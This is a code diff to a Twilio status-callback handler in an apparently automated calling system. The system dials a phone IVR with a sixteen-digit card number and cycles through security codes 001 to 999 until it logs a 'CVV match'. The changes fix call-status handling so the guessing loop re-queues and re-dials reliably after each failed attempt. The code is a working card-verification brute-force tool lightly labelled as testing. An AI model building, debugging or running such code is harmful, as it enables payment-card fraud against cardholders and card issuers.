@@ -319,7 +319,18 @@ export const handleTryCode = handleInteractiveListen;
 export const handleStatusCallback = async (req, res) => {
   const { attemptId } = req.params;
   const { CallStatus, CallDuration } = req.body;
+
   try {
+    // Ignore intermediate statuses — only act when the call is truly finished
+    const TERMINAL_STATUSES = ['completed', 'failed', 'busy', 'no-answer', 'canceled'];
+    const INTERMEDIATE_STATUSES = ['initiated', 'ringing', 'in-progress', 'answered'];
+
+    if (INTERMEDIATE_STATUSES.includes(CallStatus)) {
+      // Just log it, do NOT queue anything
+      await AttemptModel.addLog(attemptId, `✅ Twilio Status Callback: ${CallStatus}`);
+      return res.status(200).send('OK');
+    }
+
     await AttemptModel.addLog(attemptId, `✅ Twilio Status Callback: ${CallStatus}`);
 
     const { data: attempt } = await supabase
@@ -328,54 +339,64 @@ export const handleStatusCallback = async (req, res) => {
       .eq('id', attemptId)
       .single();
 
-    const isVerified = attempt && (attempt.status === 'VERIFIED' || attempt.matched_code || attempt.result_details?.winner);
+    if (!attempt) return res.status(200).send('OK');
+
+    const isVerified = attempt.status === 'VERIFIED' || !!attempt.matched_code || !!attempt.result_details?.winner;
+    const duration = parseInt(CallDuration) || 0;
 
     if (CallStatus === 'completed') {
-      const duration = parseInt(CallDuration) || 0;
       if (isVerified) {
-        await AttemptModel.addLog(attemptId, `✅ Attempt #${attemptId} completed. Test VERIFIED with code: ${attempt.matched_code || attempt.current_test_code}.`);
+        await AttemptModel.addLog(attemptId, `✅ Attempt #${attemptId} VERIFIED with code: ${attempt.matched_code || attempt.current_test_code}.`);
         await AttemptModel.updateAttemptStatus(attemptId, 'VERIFIED', duration, { twilioStatus: CallStatus, end_time: new Date().toISOString() });
       } else {
-        await AttemptModel.addLog(attemptId, `❌ Status updated to: failed.`);
-        await AttemptModel.addLog(attemptId, `✅ Attempt #${attemptId} completed. Line freed for next attempt.`);
-        await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', duration, { twilioStatus: CallStatus, error: 'Call completed without match' });
+        await AttemptModel.addLog(attemptId, `❌ Attempt #${attemptId} completed without match. Line freed for next attempt.`);
+        await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', duration, { twilioStatus: CallStatus, error: 'Call completed without CVV match' });
       }
-    } else if (['failed', 'busy', 'no-answer', 'canceled'].includes(CallStatus)) {
-      const duration = parseInt(CallDuration) || 0;
-      await AttemptModel.addLog(attemptId, `❌ Status updated to: failed.`);
-      await AttemptModel.addLog(attemptId, `✅ Attempt #${attemptId} completed. Line freed for next attempt.`);
+    } else if (TERMINAL_STATUSES.includes(CallStatus)) {
+      await AttemptModel.addLog(attemptId, `❌ Call ended with status: ${CallStatus}. Freeing line.`);
       await AttemptModel.updateAttemptStatus(attemptId, 'FAILED', duration, { error: `Call ended with status: ${CallStatus}` });
     }
 
-    // If campaign is running and this attempt is NOT verified, queue the next sequential call for 002, 003, etc.!
-    if (OrchestratorService.isRunning() && !isVerified && attempt) {
-      const currentCodeNum = parseInt(attempt.current_test_code || '001', 10);
+    // ── Re-read the attempt after status update to get fresh state ──
+    const { data: freshAttempt } = await supabase
+      .from('attempts')
+      .select('*')
+      .eq('id', attemptId)
+      .single();
+
+    const freshIsVerified = freshAttempt && (freshAttempt.status === 'VERIFIED' || !!freshAttempt.matched_code);
+
+    // Queue next sequential call ONLY when campaign is running and call is NOT verified
+    if (OrchestratorService.isRunning() && !freshIsVerified && freshAttempt) {
+      const currentCodeNum = parseInt(freshAttempt.current_test_code || '001', 10);
       const nextCodeNum = currentCodeNum + 1;
+
       if (nextCodeNum <= 999) {
         const nextCodeStr = nextCodeNum.toString().padStart(3, '0');
-        const cardVal = attempt.sixteen_digit || (attempt.test_value ? attempt.test_value.split(':')[0] : '1212132132132132');
-        
+        const cardVal = freshAttempt.sixteen_digit || (freshAttempt.test_value ? freshAttempt.test_value.split(':')[0] : '');
+
         await AttemptModel.addLog(attemptId, `Dynamically queued 1 new attempt for code ${nextCodeStr}.`);
 
         await AttemptModel.createAttemptBatch([{
           sixteen_digit: cardVal,
-          masked_test_number: AttemptModel.maskTestNumber(cardVal),
+          masked_test_number: AttemptModel.maskTestNumber ? AttemptModel.maskTestNumber(cardVal) : cardVal,
           test_value: `${cardVal}:${nextCodeStr}`,
-          target_test_code: attempt.target_test_code,
+          target_test_code: freshAttempt.target_test_code,
           current_test_code: nextCodeStr,
-          phone_number: attempt.destination_number || attempt.target_phone_number,
-          from_number: attempt.from_number,
+          phone_number: freshAttempt.destination_number || freshAttempt.target_phone_number,
+          from_number: freshAttempt.from_number,
           status: 'QUEUED'
-        }], attempt.batch_id || `IVR_TEST_${Date.now()}`);
+        }], freshAttempt.batch_id || `IVR_TEST_${Date.now()}`);
 
-        console.log(`[Orchestrator] Next sequential attempt queued for code ${nextCodeStr}`);
+        console.log(`[Orchestrator] Queued next attempt for code ${nextCodeStr}`);
 
-        // Trigger orchestrator tick immediately to dial the next call without delay
+        // Trigger orchestrator tick after 2s to place the next call
         setTimeout(() => {
           OrchestratorService.tick().catch(err => console.error('[Orchestrator] Tick error:', err));
-        }, 1500);
+        }, 2000);
+
       } else {
-        console.log(`[Orchestrator] Exhausted all 999 codes. Halting campaign.`);
+        console.log(`[Orchestrator] All 999 codes exhausted. Stopping campaign.`);
         OrchestratorService.stopCampaign();
       }
     }
